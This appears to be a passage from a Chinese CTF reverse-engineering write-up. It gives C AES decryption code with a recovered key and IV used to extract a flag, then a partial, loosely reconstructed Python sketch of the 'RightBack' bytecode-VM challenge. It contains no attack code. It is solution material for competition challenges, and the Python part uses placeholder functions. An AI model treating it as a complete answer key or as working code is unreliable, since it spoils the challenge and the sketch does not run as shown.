&#123;</span><br><span class="line">        <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">4</span>; r++) &#123;</span><br><span class="line">            s[r] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                s[r] = s[r] ^ aes_mul(state[i * <span class="number">4</span> + j], y[r * <span class="number">4</span> + j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">4</span>; r++) &#123;</span><br><span class="line">            state[i * <span class="number">4</span> + r] = s[r];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line"><span class="built_in">int</span> aes_decrypt(AES_CYPHER_T mode, uint8_t *data, <span class="built_in">int</span> <span class="built_in">len</span>, uint8_t *key)</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t w[<span class="number">4</span> * <span class="number">4</span> * <span class="number">15</span>] = &#123; <span class="number">0</span> &#125;; /* <span class="built_in">round</span> key */</span><br><span class="line">    uint8_t s[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; /* state */</span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> nr, i, j;</span><br><span class="line"></span><br><span class="line">    /* key expansion */</span><br><span class="line">    aes_key_expansion(mode, key, w);</span><br><span class="line"></span><br><span class="line">    /* start data cypher loop over <span class="built_in">input</span> buffer */</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">len</span>; i += <span class="number">4</span> * g_aes_nb[mode]) &#123;</span><br><span class="line"></span><br><span class="line">        /* init state <span class="keyword">from</span> user buffer (cyphertext) */</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">            s[j] = data[i + j];</span><br><span class="line"></span><br><span class="line">        /* start AES cypher loop over <span class="built_in">all</span> AES rounds */</span><br><span class="line">        <span class="keyword">for</span> (nr = g_aes_rounds[mode]; nr &gt;= <span class="number">0</span>; nr--) &#123;</span><br><span class="line"></span><br><span class="line">            /* do AddRoundKey */</span><br><span class="line">            aes_add_round_key(mode, s, w, nr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (nr &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (nr &lt; g_aes_rounds[mode]) &#123;</span><br><span class="line">                    /* do MixColumns */</span><br><span class="line">                    inv_mix_columns(mode, s);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                /* do ShiftRows */</span><br><span class="line">                inv_shift_rows(mode, s);</span><br><span class="line"></span><br><span class="line">                /* do SubBytes */</span><br><span class="line">                inv_sub_bytes(mode, s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* save state (cypher) to user buffer */</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">            data[i + j] = s[j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line"><span class="built_in">int</span> aes_decrypt_ecb(AES_CYPHER_T mode, uint8_t *data, <span class="built_in">int</span> <span class="built_in">len</span>, uint8_t *key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> aes_decrypt(mode, data, <span class="built_in">len</span>, key);</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line"><span class="built_in">int</span> aes_decrypt_cbc(AES_CYPHER_T mode, uint8_t *data, <span class="built_in">int</span> <span class="built_in">len</span>, uint8_t *key, uint8_t *iv)</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t w[<span class="number">4</span> * <span class="number">4</span> * <span class="number">15</span>] = &#123; <span class="number">0</span> &#125;; /* <span class="built_in">round</span> key */</span><br><span class="line">    uint8_t s[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; /* state */</span><br><span class="line">    uint8_t v[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; /* iv */</span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> nr, i, j;</span><br><span class="line"></span><br><span class="line">    /* key expansion */</span><br><span class="line">    aes_key_expansion(mode, key, w);</span><br><span class="line"></span><br><span class="line">    memcpy(v, iv, sizeof(v));</span><br><span class="line"></span><br><span class="line">    /* start data cypher loop over <span class="built_in">input</span> buffer */</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">len</span>; i += <span class="number">4</span> * g_aes_nb[mode]) &#123;</span><br><span class="line"></span><br><span class="line">        /* init state <span class="keyword">from</span> user buffer (cyphertext) */</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">            s[j] = data[i + j];</span><br><span class="line"></span><br><span class="line">        /* start AES cypher loop over <span class="built_in">all</span> AES rounds */</span><br><span class="line">        <span class="keyword">for</span> (nr = g_aes_rounds[mode]; nr &gt;= <span class="number">0</span>; nr--) &#123;</span><br><span class="line"></span><br><span class="line">            /* do AddRoundKey */</span><br><span class="line">            aes_add_round_key(mode, s, w, nr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (nr &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (nr &lt; g_aes_rounds[mode]) &#123;</span><br><span class="line">                    /* do MixColumns */</span><br><span class="line">                    inv_mix_columns(mode, s);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                /* do ShiftRows */</span><br><span class="line">                inv_shift_rows(mode, s);</span><br><span class="line"></span><br><span class="line">                /* do SubBytes */</span><br><span class="line">                inv_sub_bytes(mode, s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* save state (cypher) to user buffer */</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++) &#123;</span><br><span class="line">            uint8_t p = s[j] ^ v[j];</span><br><span class="line">            v[j] = data[i + j];</span><br><span class="line">            data[i + j] = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">void aes_cypher_128_test()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">#if 1</span></span><br><span class="line">    uint8_t buf[] = &#123; <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x77</span>,</span><br><span class="line">        <span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0xaa</span>, <span class="number">0xbb</span>, <span class="number">0xcc</span>, <span class="number">0xdd</span>, <span class="number">0xee</span>, <span class="number">0xff</span> &#125;;</span><br><span class="line">    uint8_t key[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>,</span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span> &#125;;</span><br><span class="line"><span class="comment">#else</span></span><br><span class="line">    uint8_t buf[] = &#123; <span class="number">0x32</span>, <span class="number">0x43</span>, <span class="number">0xf6</span>, <span class="number">0xa8</span>, <span class="number">0x88</span>, <span class="number">0x5a</span>, <span class="number">0x30</span>, <span class="number">0x8d</span>,</span><br><span class="line">        <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x98</span>, <span class="number">0xa2</span>, <span class="number">0xe0</span>, <span class="number">0x37</span>, <span class="number">0x07</span>, <span class="number">0x34</span> &#125;;</span><br><span class="line">    uint8_t key[] = &#123; <span class="number">0x2b</span>, <span class="number">0x7e</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x28</span>, <span class="number">0xae</span>, <span class="number">0xd2</span>, <span class="number">0xa6</span>,</span><br><span class="line">        <span class="number">0xab</span>, <span class="number">0xf7</span>, <span class="number">0x15</span>, <span class="number">0x88</span>, <span class="number">0x09</span>, <span class="number">0xcf</span>, <span class="number">0x4f</span>, <span class="number">0x3c</span> &#125;;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"></span><br><span class="line">    aes_encrypt(AES_CYPHER_128, buf, sizeof(buf), key);</span><br><span class="line"></span><br><span class="line">    aes_decrypt(AES_CYPHER_128, buf, sizeof(buf), key);</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">void aes_cypher_192_test()</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t buf[] = &#123; <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x77</span>,</span><br><span class="line">        <span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0xaa</span>, <span class="number">0xbb</span>, <span class="number">0xcc</span>, <span class="number">0xdd</span>, <span class="number">0xee</span>, <span class="number">0xff</span> &#125;;</span><br><span class="line">    uint8_t key[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>,</span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>,</span><br><span class="line">        <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span> &#125;;</span><br><span class="line"></span><br><span class="line">    aes_encrypt(AES_CYPHER_192, buf, sizeof(buf), key);</span><br><span class="line"></span><br><span class="line">    aes_decrypt(AES_CYPHER_192, buf, sizeof(buf), key);</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">void aes_cypher_256_test()</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t buf[] = &#123; <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x77</span>,</span><br><span class="line">        <span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0xaa</span>, <span class="number">0xbb</span>, <span class="number">0xcc</span>, <span class="number">0xdd</span>, <span class="number">0xee</span>, <span class="number">0xff</span> &#125;;</span><br><span class="line">    uint8_t key[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>,</span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>,</span><br><span class="line">        <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>,</span><br><span class="line">        <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1e</span>, <span class="number">0x1f</span> &#125;;</span><br><span class="line"></span><br><span class="line">    aes_encrypt(AES_CYPHER_256, buf, sizeof(buf), key);</span><br><span class="line"></span><br><span class="line">    aes_decrypt(AES_CYPHER_256, buf, sizeof(buf), key);</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    //数据</span><br><span class="line">    uint8_t buf[] = &#123; <span class="number">0x2b</span>,<span class="number">0xc8</span>,<span class="number">0x20</span>,<span class="number">0x8b</span>,<span class="number">0x5c</span>,<span class="number">0x0d</span>,<span class="number">0xa7</span>,<span class="number">0x9b</span>,<span class="number">0x2a</span>,<span class="number">0x51</span>,<span class="number">0x3a</span>,<span class="number">0xd2</span>,<span class="number">0x71</span>,<span class="number">0x71</span>,<span class="number">0xca</span>,<span class="number">0x50</span> &#125;;</span><br><span class="line">    //密钥</span><br><span class="line">    uint8_t key[] = &#123; <span class="number">0x52</span>,<span class="number">0x65</span>,<span class="number">0x5f</span>,<span class="number">0x31</span>,<span class="number">0x73</span>,<span class="number">0x5f</span>,<span class="number">0x65</span>,<span class="number">0x61</span>,<span class="number">0x53</span>,<span class="number">0x79</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x36</span> &#125;;</span><br><span class="line">    //uint8_t key[] = &#123; <span class="number">0x52</span>,<span class="number">0x65</span>,<span class="number">0x5f</span>,<span class="number">0x31</span>,<span class="number">0x73</span>,<span class="number">0x5f</span>,<span class="number">0x65</span>,<span class="number">0x61</span>,<span class="number">0x53</span>,<span class="number">0x79</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x36</span> &#125;;</span><br><span class="line">    //向量</span><br><span class="line">    uint8_t iv[] = &#123;<span class="number">0x31</span>, <span class="number">0x5F</span>, <span class="number">0x65</span>, <span class="number">0x52</span>, <span class="number">0x61</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x79</span>, <span class="number">0x53</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>&#125;;</span><br><span class="line">    switch (sizeof(key))</span><br><span class="line">    &#123;</span><br><span class="line">    //ECB</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">16</span>:aes_decrypt(AES_CYPHER_128, buf, sizeof(buf), key); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24</span>:aes_decrypt(AES_CYPHER_192, buf, sizeof(buf), key); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">32</span>:aes_decrypt(AES_CYPHER_256, buf, sizeof(buf), key); <span class="keyword">break</span>;</span><br><span class="line">    //CBC</span><br><span class="line">    /*</span><br><span class="line">    <span class="keyword">case</span> <span class="number">16</span>:aes_decrypt_cbc(AES_CYPHER_128, buf, sizeof(buf), key, iv); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24</span>:aes_decrypt_cbc(AES_CYPHER_192, buf, sizeof(buf), key, iv); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">32</span>:aes_decrypt_cbc(AES_CYPHER_256, buf, sizeof(buf), key, iv); <span class="keyword">break</span>;</span><br><span class="line">    */</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; sizeof(buf); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;%x&quot;</span>, buf[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拼一块就是flag</p>
<h2><span id="rightback">RightBack</span><a href="#rightback" class="header-anchor"></a></h2><p>很恶心的字节码很长，大致逻辑是这样的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">T = <span class="keyword">lambda</span>: <span class="number">1</span></span><br><span class="line">p1 = <span class="keyword">lambda</span>: <span class="number">2</span></span><br><span class="line">p2 = <span class="keyword">lambda</span>: <span class="number">3</span></span><br><span class="line">p3 = <span class="keyword">lambda</span>: <span class="number">4</span></span><br><span class="line">F1 = <span class="keyword">lambda</span>: <span class="number">5</span></span><br><span class="line">F2 = <span class="keyword">lambda</span>: <span class="number">6</span></span><br><span class="line">F3 = <span class="keyword">lambda</span>: <span class="number">7</span></span><br><span class="line">F4 = <span class="keyword">lambda</span>: <span class="number">8</span></span><br><span class="line">F5 = <span class="keyword">lambda</span>: <span class="number">9</span></span><br><span class="line">F6 = <span class="keyword">lambda</span>: <span class="number">10</span></span><br><span class="line">F7 = <span class="keyword">lambda</span>: <span class="number">11</span></span><br><span class="line">F8 = <span class="keyword">lambda</span>: <span class="number">12</span></span><br><span class="line">F9 = <span class="keyword">lambda</span>: <span class="number">13</span></span><br><span class="line">FA = <span class="keyword">lambda</span>: <span class="number">14</span></span><br><span class="line">FB = <span class="keyword">lambda</span>: <span class="number">15</span></span><br><span class="line">WC = <span class="keyword">lambda</span>: <span class="number">16</span></span><br><span class="line">VM = <span class="keyword">lambda</span>: <span class="number">17</span></span><br><span class="line">Have = <span class="keyword">lambda</span>: <span class="number">18</span></span><br><span class="line">Fun = <span class="keyword">lambda</span>: <span class="number">19</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    REG = &#123;&#125;</span><br><span class="line">    EIP = <span class="number">0</span></span><br><span class="line">    reg_table = &#123;<span class="string">&#x27;EAX&#x27;</span>: (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>)&#125;</span><br><span class="line">    Sbox = [</span><br><span class="line">    (<span class="number">82</span>, <span class="number">9</span>, <span class="number">106</span>, <span class="number">213</span>, <span class="number">48</span>, <span class="number">54</span>, <span class="number">165</span>, <span class="number">56</span>, <span class="number">191</span>, <span class="number">64</span>, <span class="number">163</span>, <span class="number">158</span>, <span class="number">129</span>, <span class="number">243</span>, <span class="number">215</span>, <span class="number">251</span>, <span class="number">124</span>, <span class="number">227</span>, <span class="number">57</span>, <span class="number">130</span>, <span class="number">155</span>, <span class="number">47</span>, <span class="number">255</span>, <span class="number">135</span>, <span class="number">52</span>, <span class="number">142</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">196</span>, <span class="number">222</span>, <span class="number">233</span>, <span class="number">203</span>, <span class="number">84</span>, <span class="number">123</span>, <span class="number">148</span>, <span class="number">50</span>, <span class="number">166</span>, <span class="number">194</span>, <span class="number">35</span>, <span class="number">61</span>, <span class="number">238</span>, <span class="number">76</span>, <span class="number">149</span>, <span class="number">11</span>, <span class="number">66</span>, <span class="number">250</span>, <span class="number">195</span>, <span class="number">78</span>, <span class="number">8</span>, <span class="number">46</span>, <span class="number">161</span>, <span class="number">102</span>, <span class="number">40</span>, <span class="number">217</span>, <span class="number">36</span>, <span class="number">178</span>, <span class="number">118</span>, <span class="number">91</span>, <span class="number">162</span>, <span class="number">73</span>, <span class="number">109</span>, <span class="number">139</span>, <span class="number">209</span>, <span class="number">37</span>, <span class="number">114</span>, <span class="number">248</span>, <span class="number">246</span>, <span class="number">100</span>, <span class="number">134</span>, <span class="number">104</span>, <span class="number">152</span>, <span class="number">22</span>, <span class="number">212</span>, <span class="number">164</span>, <span class="number">92</span>, <span class="number">204</span>, <span class="number">93</span>, <span class="number">101</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">253</span>, <span class="number">237</span>, <span class="number">185</span>, <span class="number">218</span>, <span class="number">94</span>, <span class="number">21</span>, <span class="number">70</span>, <span class="number">87</span>, <span class="number">167</span>, <span class="number">141</span>, <span class="number">157</span>, <span class="number">132</span>, <span class="number">144</span>, <span class="number">216</span>, <span class="number">171</span>, <span class="number">0</span>, <span class="number">140</span>, <span class="number">188</span>, <span class="number">211</span>, <span class="number">10</span>, <span class="number">247</span>, <span class="number">228</span>, <span class="number">88</span>, <span class="number">5</span>, <span class="number">184</span>, <span class="number">179</span>, <span class="number">69</span>, <span class="number">6</span>, <span class="number">208</span>, <span class="number">44</span>, <span class="number">30</span>, <span class="number">143</span>, <span class="number">202</span>, <span class="number">63</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">193</span>, <span class="number">175</span>, <span class="number">189</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">107</span>, <span class="number">58</span>, <span class="number">145</span>, <span class="number">17</span>, <span class="number">65</span>, <span class="number">79</span>, <span class="number">103</span>, <span class="number">220</span>, <span class="number">234</span>, <span class="number">151</span>, <span class="number">242</span>, <span class="number">207</span>, <span class="number">206</span>, <span class="number">240</span>, <span class="number">180</span>, <span class="number">230</span>, <span class="number">115</span>, <span class="number">150</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">34</span>, <span class="number">231</span>, <span class="number">173</span>, <span class="number">53</span>, <span class="number">133</span>, <span class="number">226</span>, <span class="number">249</span>, <span class="number">55</span>, <span class="number">232</span>, <span class="number">28</span>, <span class="number">117</span>, <span class="number">223</span>, <span class="number">110</span>, <span class="number">71</span>, <span class="number">241</span>, <span class="number">26</span>, <span class="number">113</span>, <span class="number">29</span>, <span class="number">41</span>, <span class="number">197</span>, <span class="number">137</span>, <span class="number">111</span>, <span class="number">183</span>, <span class="number">98</span>, <span class="number">14</span>, <span class="number">170</span>, <span class="number">24</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">252</span>, <span class="number">86</span>, <span class="number">62</span>, <span class="number">75</span>, <span class="number">198</span>, <span class="number">210</span>, <span class="number">121</span>, <span class="number">32</span>, <span class="number">154</span>, <span class="number">219</span>, <span class="number">192</span>, <span class="number">254</span>, <span class="number">120</span>, <span class="number">205</span>, <span class="number">90</span>, <span class="number">244</span>, <span class="number">31</span>, <span class="number">221</span>, <span class="number">168</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">7</span>, <span class="number">199</span>, <span class="number">49</span>, <span class="number">177</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">89</span>, <span class="number">39</span>, <span class="number">128</span>, <span class="number">236</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">81</span>, <span class="number">127</span>, <span class="number">169</span>, <span class="number">25</span>, <span class="number">181</span>, <span class="number">74</span>, <span class="number">13</span>, <span class="number">45</span>, <span class="number">229</span>, <span class="number">122</span>, <span class="number">159</span>, <span class="number">147</span>, <span class="number">201</span>, <span class="number">156</span>, <span class="number">239</span>, <span class="number">160</span>, <span class="number">224</span>, <span class="number">59</span>, <span class="number">77</span>, <span class="number">174</span>, <span class="number">42</span>, <span class="number">245</span>, <span class="number">176</span>, <span class="number">200</span>, <span class="number">235</span>, <span class="number">187</span>, <span class="number">60</span>, <span class="number">131</span>, <span class="number">83</span>, <span class="number">153</span>, <span class="number">97</span>, <span class="number">23</span>, <span class="number">43</span>, <span class="number">4</span>, <span class="number">126</span>, <span class="number">186</span>, <span class="number">119</span>, <span class="number">214</span>, <span class="number">38</span>, <span class="number">225</span>, <span class="number">105</span>, <span class="number">20</span>, <span class="number">99</span>, <span class="number">85</span>, <span class="number">33</span>, <span class="number">12</span>, <span class="number">125</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">    Rcon = [</span><br><span class="line">        <span class="number">16777216</span>, <span class="number">33554432</span>, <span class="number">67108864</span>, <span class="number">134217728</span>, <span class="number">268435456</span>, <span class="number">536870912</span>, <span class="number">1073741824</span>, <span class="number">0x80000000L</span>, <span class="number">452984832</span>, <span class="number">905969664</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    s = []</span><br><span class="line"></span><br><span class="line">    key = <span class="string">&#x27;CalmDownBelieveU&#x27;</span></span><br><span class="line">    s = p1(s, key)<span class="comment">#key初始化</span></span><br><span class="line">    key = [<span class="number">61</span>, <span class="number">15</span>, <span class="number">58</span>, <span class="number">65</span>, <span class="number">177</span>, <span class="number">180</span>, <span class="number">182</span>, <span class="number">248</span>, <span class="number">192</span>, <span class="number">143</span>, <span class="number">37</span>, <span class="number">238</span>, <span class="number">50</span>, <span class="number">29</span>, <span class="number">215</span>, <span class="number">190</span>]</span><br><span class="line">    s.extend(key)</span><br><span class="line">    key = <span class="built_in">bytes</span>(p3(s, key))</span><br><span class="line">    key = p2(<span class="built_in">bytes</span>(key))</span><br><span class="line">    extendKey = key</span><br><span class="line">    opcode = []</span><br><span class="line">    s.extend([<span class="number">69</span>, <span class="number">136</span>, <span class="number">121</span>, <span class="number">24</span>, <span class="number">179</span>, <span class="number">67</span>, <span class="number">209</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">169</span>, <span class="number">205</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">124</span>, <span class="number">49</span>, <span class="number">20</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">52</span>, <span class="number">71</span>, <span class="number">174</span>, <span class="number">164</span>, <span class="number">134</span>, <span class="number">60</span>, <span class="number">184</span>, <span class="number">203</span>, <span class="number">131</span>, <span class="number">210</span>, <span class="number">57</span>, <span class="number">151</span>, <span class="number">77</span>, <span class="number">241</span>, <span class="number">61</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">52</span>, <span class="number">235</span>, <span class="number">37</span>, <span class="number">100</span>, <span class="number">178</span>, <span class="number">8</span>, <span class="number">238</span>, <span class="number">205</span>, <span class="number">27</span>, <span class="number">194</span>, <span class="number">159</span>, <span class="number">230</span>, <span class="number">165</span>, <span class="number">211</span>, <span class="number">221</span>, <span class="number">100</span>, <span class="number">217</span>, <span class="number">111</span>, <span class="number">202</span>, <span class="number">185</span>, <span class="number">207</span>, <span class="number">226</span>, <span class="number">50</span>, <span class="number">88</span>, <span class="number">4</span>, <span class="number">58</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">92</span>, <span class="number">24</span>, <span class="number">230</span>, <span class="number">246</span>, <span class="number">245</span>, <span class="number">21</span>, <span class="number">110</span>, <span class="number">182</span>, <span class="number">151</span>, <span class="number">85</span>, <span class="number">28</span>, <span class="number">181</span>, <span class="number">191</span>, <span class="number">185</span>, <span class="number">236</span>, <span class="number">92</span>, <span class="number">98</span>, <span class="number">222</span>, <span class="number">85</span>, <span class="number">228</span>, <span class="number">14</span>, <span class="number">235</span>, <span class="number">93</span>, <span class="number">77</span>, <span class="number">161</span>, <span class="number">61</span>, <span class="number">140</span>, <span class="number">222</span>, <span class="number">74</span>, <span class="number">124</span>, <span class="number">13</span>, <span class="number">211</span>, <span class="number">75</span>, <span class="number">134</span>, <span class="number">235</span>, <span class="number">164</span>, <span class="number">228</span>, <span class="number">235</span>, <span class="number">16</span>, <span class="number">29</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">105</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">232</span>, <span class="number">65</span>, <span class="number">209</span>, <span class="number">165</span>, <span class="number">35</span>, <span class="number">182</span>, <span class="number">248</span>, <span class="number">245</span>, <span class="number">69</span>, <span class="number">18</span>, <span class="number">152</span>, <span class="number">71</span>, <span class="number">223</span>, <span class="number">85</span>, <span class="number">114</span>])</span><br><span class="line">    p3_result = p3(s, FB())</span><br><span class="line">    right = Have()</span><br><span 